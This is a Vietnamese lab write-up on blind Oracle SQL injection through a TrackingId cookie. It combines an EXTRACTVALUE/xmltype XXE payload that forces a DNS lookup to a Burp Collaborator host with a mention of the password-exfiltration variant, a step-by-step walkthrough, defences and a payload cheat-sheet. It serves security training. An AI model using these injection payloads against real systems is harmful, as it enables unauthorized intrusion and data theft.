# Lab 15 — Blind SQL Injection with Out-of-band Interaction

## Mục tiêu
Khai thác lỗ hổng SQLi mù trong cookie `TrackingId`, khi query chạy **bất đồng bộ (asynchronous)** nên **hoàn toàn không có bất kỳ tín hiệu in-band nào** (không content diff, không status diff, không error message) — buộc phải dùng kỹ thuật **Out-of-band (OOB)**: kết hợp SQLi + XXE để ép Oracle tự tạo 1 DNS lookup ra Burp Collaborator, chứng minh injectable mà không cần đọc được bất kỳ dữ liệu gì qua response.

---

## 1. Bản chất lỗ hổng

**Root cause:** Giống mọi lab SQLi khác trong chuỗi — cookie `TrackingId` bị nối chuỗi trực tiếp vào câu SQL backend, không qua parameterized query.

**Điểm khác biệt cốt lõi — vì sao mọi kỹ thuật đã học trước đó đều vô dụng:**

Đề bài nêu rõ: *"The SQL query is executed asynchronously and has no effect on the application's response."*

| Lab | Tín hiệu dùng để suy luận true/false | Có dùng được ở lab này không? |
|---|---|---|
| Lab 11 (Conditional responses) | Nội dung response khác nhau | ❌ Response luôn giống hệt nhau, không phụ thuộc query |
| Lab 12 (Conditional errors) | HTTP status khác nhau (200/500) | ❌ Query đúng/sai không ảnh hưởng status trả về |
| Lab 18 (Visible error-based) | Nội dung error message chứa data | ❌ Không có error nào của query tracking lộ ra response |
| Lab 14 (Time delays) | Thời gian phản hồi khác nhau | ❌ Query async → server không chờ nó chạy xong mới trả response, nên dù `pg_sleep()`/tương đương chạy bao lâu cũng không đo được qua response time |
| **Lab 15 (OOB interaction)** | **DNS lookup DB tự gọi ra ngoài** | ✅ Kênh duy nhất còn khả dụng, hoàn toàn tách biệt khỏi response HTTP |

**Điểm quan trọng cần phân biệt (bài học thực chiến từ chính lab này):** dù query tracking chạy async không ảnh hưởng response, **lỗi cú pháp XML lại xảy ra đồng bộ ngay lúc parse** — nếu payload sai cú pháp (thiếu `http://`, thiếu dấu `/`), Oracle vẫn ném lỗi 500 ngay lập tức. Điều này không mâu thuẫn với đề bài: đề bài chỉ nói *kết quả* của query tracking (dữ liệu nó trả về) không ảnh hưởng response, chứ không nói *lỗi cú pháp khi build câu lệnh* cũng bị nuốt.

→ Vì vậy, response 200 "sạch" (không lỗi) trong lab này không chứng minh được payload đã trigger network call — nó chỉ chứng minh **cú pháp XML hợp lệ, Oracle parse được**. Muốn biết payload có thật sự chạm tới Collaborator hay không, **bắt buộc phải poll tab Collaborator**, không thể suy luận qua response.

**DBMS:** Oracle (dùng `EXTRACTVALUE`, `xmltype` — đặc thù Oracle đã quen thuộc từ Lab 10, 12, 16).

---

## 2. Vì sao phải kết hợp XXE — Oracle không có network function đơn giản

Không giống MSSQL (`xp_dirtree` có thể trigger UNC path lookup trực tiếp), Oracle **không có sẵn 1 hàm SQL đơn giản để tự gọi ra URL ngoài**.

→ Phải khai thác gián tiếp qua cơ chế **XXE (XML External Entity)**, lồng bên trong hàm xử lý XML của Oracle:

- `EXTRACTVALUE(xmltype('<xml>...</xml>'), '/path')` — hàm Oracle trích xuất giá trị từ 1 node XML theo XPath.
- Bản thân hàm này chỉ là "vỏ bọc" — mục đích thật sự không phải lấy giá trị XML, mà là **ép Oracle phải parse đoạn XML đầu vào** (bước `xmltype(...)` bắt buộc phải chạy XML parser trước khi `EXTRACTVALUE` có thể trích xuất bất cứ gì).
- Trong đoạn XML đó, nhúng 1 **external DTD entity**:
  ```xml
  <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ATTACKER_URL/"> %remote; ]>
  ```
- Khi Oracle's XML parser gặp `SYSTEM "http://..."`, nó **tự động đi fetch URL đó** (đúng hành vi XXE kinh điển — external entity được resolve tại thời điểm parse).
- `%remote;` ở cuối là bước **tham chiếu/gọi** entity vừa khai báo — nếu thiếu dòng này, entity chỉ được khai báo mà không được "gọi", sẽ không có request nào xảy ra.

→ Kết quả: **Oracle server tự làm HTTP/DNS client**, gọi ra Collaborator đúng lúc xử lý câu query — hoàn toàn nằm ngoài tầm kiểm soát của response HTTP trả về cho attacker.

**Khác biệt so với Lab 16 (data exfiltration):** ở lab này bạn chỉ cần **chứng minh injectable** (1 DNS lookup xuất hiện là đủ) — không cần nhúng thêm `||(SELECT password...)||` vào URL để lấy dữ liệu thật. Đây là bước đệm trước Lab 16, chỉ khai thác được khả năng "gọi ra ngoài", chưa khai thác khả năng "đọc dữ liệu qua kênh đó".

---

## 3. Cấu trúc payload cốt lõi

```sql
' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote;]>'),'/l')='1
```

Bóc tách theo 3 lớp, đọc từ **trong ra ngoài**:

**Lớp 1 — Trong cùng: khai báo XML external entity (phần XXE thật sự)**
```xml
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote;]>
```
- `<!ENTITY % remote SYSTEM "http://SUBDOMAIN/">`: định nghĩa 1 **parameter entity** tên `remote`, nội dung được lấy từ bên ngoài (`SYSTEM`) qua HTTP.
- `%remote;`: **tham chiếu/gọi** entity — buộc parser phải đi fetch URL để thay thế vào chỗ tham chiếu này. Đây chính là hành động tạo ra DNS + HTTP request ra ngoài.
- Bạn không cần quan tâm URL trả về nội dung gì — chỉ cần chứng minh parser **đã cố gắng fetch nó**, việc "cố gắng" đó tự nó đã tạo ra DNS lookup đủ để Collaborator ghi nhận.

**Lớp 2 — `EXTRACTVALUE(xmltype('...'), '/l')`: ép Oracle phải parse XML**
- `xmltype('...')`: chuyển chuỗi text thành kiểu XML — bước này bắt buộc Oracle chạy XML parser, và trong lúc parse sẽ gặp `<!DOCTYPE>` chứa external entity ở Lớp 1 → kích hoạt fetch.
- `EXTRACTVALUE(..., '/l')`: trích giá trị theo XPath `/l` — XPath này không cần tồn tại thật trong XML, chỉ là "cái cớ" hợp lệ về cú pháp để gọi hàm, tác dụng thật nằm ở side-effect của quá trình parse, không phải giá trị trả về.

**Lớp 3 — Ngoài cùng: gắn vào điều kiện SQL (không dùng UNION)**
```sql
' AND EXTRACTVALUE(...) = '1
```
- `'` đóng chuỗi gốc của cookie, thoát khỏi ngữ cảnh data.
- `AND ... = '1`: nối thêm điều kiện vào mệnh đề `WHERE` — **không cần biết số cột** vì đây không phải UNION SELECT (khác cách tiếp cận ban đầu định dùng `ORDER BY` để đếm cột, nhưng không khả thi vì không có tín hiệu 500 để dò).
- Vế `= '1` chỉ để giữ cú pháp so sánh boolean hợp lệ — giá trị đúng/sai của biểu thức này không quan trọng, vì response không phản ánh gì cả (query async).

---

## 4. Quy trình khai thác đầy đủ (từng bước đã thực hiện)

### Bước 0 — Thử đếm số cột bằng `ORDER BY` (và phát hiện vì sao nó không khả thi)

Test ở Repeater:
```
TrackingId=x' ORDER BY 1--
TrackingId=x' ORDER BY 2--
...
TrackingId=x' ORDER BY 30--
```
**Kết quả quan sát:** toàn bộ từ 1→30 đều trả về **200 OK**, không hề có 500 xuất hiện ở bất kỳ giá trị nào.

**Kết luận rút ra:** đây **không phải** dấu hiệu bạn làm sai — mà là bằng chứng trực tiếp cho việc query async: vì response được tạo ra độc lập, không chờ và không phụ thuộc kết quả câu query chứa `ORDER BY`, nên dù cú pháp đúng hay sai, số cột khớp hay không, response luôn 200 như nhau. → Từ đây xác định: **không dùng được UNION SELECT** (vì không thể verify số cột), phải chuyển sang tiêm điều kiện qua `AND` (không cần biết số cột), giống cách tiếp cận ở Lab 11/12.

### Bước 1 — Mở tab Collaborator, lấy subdomain
Vào **Burp menu → Collaborator tab** → bấm **Copy to clipboard** → Burp sinh 1 subdomain unique (VD `f2igkbgkgvjbwtln6rlwncpm6dc4ouoj.oastify.com`) và bắt đầu theo dõi phiên này.

### Bước 2 — Gõ payload với placeholder cho subdomain (chưa insert vội)

Gõ vào cookie `TrackingId` (dạng plain text, chưa encode):

```sql
x' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote;]>'),'/l')='1
```

### Bước 3 — Bôi đen CHÍNH XÁC chữ `SUBDOMAIN` → Insert Collaborator payload

**Bẫy thực tế đã gặp ở lần thử đầu:** bôi đen nhầm cả cụm `http://SUBDOMAIN/` (bao gồm cả scheme và dấu `/`) trước khi Insert → Burp thay thế **toàn bộ vùng bôi đen** bằng đúng mỗi domain thuần, xóa mất `http://` và dấu `/` bao quanh.

**Hệ quả:** `SYSTEM "domain-thuần-không-scheme"` là 1 **URI không hợp lệ về cú pháp XML** (thiếu scheme bắt buộc) → Oracle's XML parser bắt lỗi ngay tại bước parse DTD, ném ra **500 Internal Server Error** — lỗi xảy ra trước khi kịp thử fetch ra ngoài, nên dù Poll Collaborator cũng sẽ không thấy interaction nào.

**Cách sửa đúng:** chỉ bôi đen **đúng chữ `SUBDOMAIN`** (không lấy `http://` phía trước và dấu `/` phía sau) → chuột phải → **Insert Collaborator payload**. Kiểm tra lại ở tab Raw, đảm bảo cấu trúc đầy đủ dạng `http://xxxxx.oastify.com/` trước khi gửi.

### Bước 4 — Encode và Send

1. Bôi đen **toàn bộ** giá trị cookie vừa sửa → **Ctrl+U đúng 1 lần** (tránh double-encode).
2. **Send**.
3. Response trả về **200 OK bình thường** (không còn 500) — xác nhận cú pháp XML lần này hợp lệ, Oracle parse thành công.

### Bước 5 — Poll Collaborator và xác nhận

1. Qua tab **Collaborator → Poll now**.
2. Kết quả: xuất hiện 1 **DNS interaction** (có thể kèm HTTP) đúng với subdomain vừa insert.
3. Lab tự động chuyển từ "Not solved" sang **"Solved"** — vì mục tiêu bài này chỉ là chứng minh trigger được interaction, không cần đọc dữ liệu gì thêm.

---

## 5. Lỗi thực tế đã gặp và cách sửa (tổng hợp)

| # | Lỗi gặp phải | Nguyên nhân | Cách sửa |
|---|---|---|---|
| 1 | Gõ nhầm `30-;` thay vì `30--` khi test `ORDER BY` | Gõ tay nhầm dấu `;` thay vì dấu `-` lần 2 — comment Oracle cần đúng 2 dấu gạch ngang liên tiếp | Luôn kiểm tra kỹ ở tab Raw, đếm chính xác số ký tự `-` |
| 2 | `ORDER BY` 1→30 đều 200, không tìm được ranh giới số cột | Query chạy async, response không phụ thuộc kết quả/lỗi của query đó → kỹ thuật dựa vào tín hiệu response (kể cả lỗi cú pháp SQL logic) hoàn toàn vô hiệu | Bỏ hẳn UNION SELECT, chuyển sang tiêm điều kiện qua `AND` — không cần biết số cột |
| 3 | Payload `EXTRACTVALUE` gây lỗi 500 dù đã đúng ý tưởng | Bôi đen sai vùng trước khi Insert Collaborator payload (lấy cả `http://` và `/`) → Burp xóa mất phần scheme, để lại URI không hợp lệ cú pháp XML | Chỉ bôi đen đúng placeholder `SUBDOMAIN`, giữ nguyên `http://` và `/` đã gõ tay xung quanh |

---

## 6. So sánh nhanh: Lab 15 (OOB interaction) vs Lab 16 (OOB data exfiltration)

| Đặc điểm | Lab 15 (lab này) | Lab 16 |
|---|---|---|
| Mục tiêu | Chỉ cần chứng minh injectable — trigger được 1 DNS lookup | Đọc được nguyên giá trị password thật qua kênh OOB |
| Payload cốt lõi | `EXTRACTVALUE(xmltype('...SYSTEM "http://SUBDOMAIN/"...'),'/l')` | Thêm `||(SELECT password FROM users...)||` nối vào ngay trong URL bị gọi |
| Cách tiêm | `' AND EXTRACTVALUE(...) = '1` (không cần UNION, không cần biết số cột) | `' UNION SELECT EXTRACTVALUE(...) FROM dual--` (cần `FROM dual`, dùng UNION) |
| Đọc kết quả | Chỉ cần thấy interaction xuất hiện trong tab Collaborator | Phải mở dòng interaction → xem `Host:` header → tách phần trước dấu chấm đầu = data leak |
| Độ phức tạp | Bước đệm — xác nhận khả năng OOB tồn tại | Bước nâng cao — khai thác khả năng đó để lấy dữ liệu thật |

---

## 7. Phòng chống

- **Gốc rễ:** Parameterized query / prepared statement — driver tách kênh code và data ở tầng giao thức, input không bao giờ được parser SQL đọc như cú pháp.
- **Chặn OOB cụ thể:** Vô hiệu hóa resolve external entity trong XML parser (`disable-external-entities` hoặc flag an toàn tương đương của DB engine) — chặn được vector XXE cụ thể này, nhưng **không vá được injection point gốc**.
- **Kiểm soát network egress của DB server:** firewall rule chặn DB server tự mở outbound connection ra internet — hạn chế thiệt hại của kỹ thuật OOB nói chung.
- **Lưu ý quan trọng:** vì bug này né tránh hoàn toàn mọi in-band channel (do thiết kế async), suppress error hay tune timeout đều không giúp gì — đây là minh chứng rõ nhất cho nguyên tắc: **chỉ có parameterization mới triệt tiêu injection point tận gốc**, mọi biện pháp khác chỉ chặn từng kênh lộ dữ liệu cụ thể.

---

## 8. Câu hỏi tự kiểm tra

1. Vì sao kỹ thuật `ORDER BY` dò số cột — vốn hoạt động tốt ở Lab 10 — lại hoàn toàn vô dụng ở lab này? Điều gì trong kiến trúc xử lý query (đồng bộ vs bất đồng bộ) quyết định việc 1 kỹ thuật dựa vào response có khả thi hay không?
2. Vì sao lỗi cú pháp XML (thiếu `http://`) vẫn tạo ra 500 ngay lập tức, dù đề bài nói query tracking chạy async "không ảnh hưởng response"? Ranh giới giữa "kết quả của query" và "lỗi cú pháp khi build câu lệnh" nằm ở đâu?
3. Vì sao phải "mượn" cơ chế XXE để tạo network call, thay vì Oracle có sẵn 1 hàm SQL đơn giản để tự gọi HTTP như MSSQL?
4. Vai trò của `EXTRACTVALUE(xmltype(...), '/l')` trong payload này là gì, nếu bạn biết chắc XPath `/l` không hề tồn tại thật trong tài liệu XML? (Gợi ý: mục đích không phải lấy đúng giá trị, mà để làm gì?)
5. Vì sao việc bôi đen sai vùng trước khi Insert Collaborator payload (bôi cả `http://.../` thay vì chỉ bôi placeholder) lại xóa mất đúng phần quan trọng nhất — điều này nói lên gì về việc cần hiểu rõ từng phần payload đang làm gì trước khi dùng tool tự động hỗ trợ?
6. So với Lab 16, thiếu đi phần `||(SELECT password...)||`, payload ở lab này còn chứng minh được điều gì, và mất đi khả năng gì?

---

## 9. Payload cuối cùng (cheat-sheet)

```sql
-- Cấu trúc payload đầy đủ (dạng plain text, trước khi encode)
' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')='1
```

**Checklist trước khi Send:**
- [ ] Đã bỏ hẳn ý định dùng `UNION SELECT`/`ORDER BY` để đếm cột (không khả thi với query async)
- [ ] Chỉ bôi đen đúng placeholder subdomain, giữ nguyên `http://` và `/` xung quanh khi Insert Collaborator payload
- [ ] Đã Ctrl+U đúng 1 lần (kiểm tra tab Raw, không double-encode)
- [ ] Response trả về 200 (không phải 500) — xác nhận cú pháp XML hợp lệ trước khi poll

**Đọc kết quả:** Tab Collaborator → Poll now → thấy dòng interaction loại DNS (kèm HTTP) → lab Solved, không cần đăng nhập hay lấy thêm dữ liệu gì.

**Yêu cầu môi trường:** Bắt buộc Burp Suite Professional (Collaborator client không có ở bản Community).
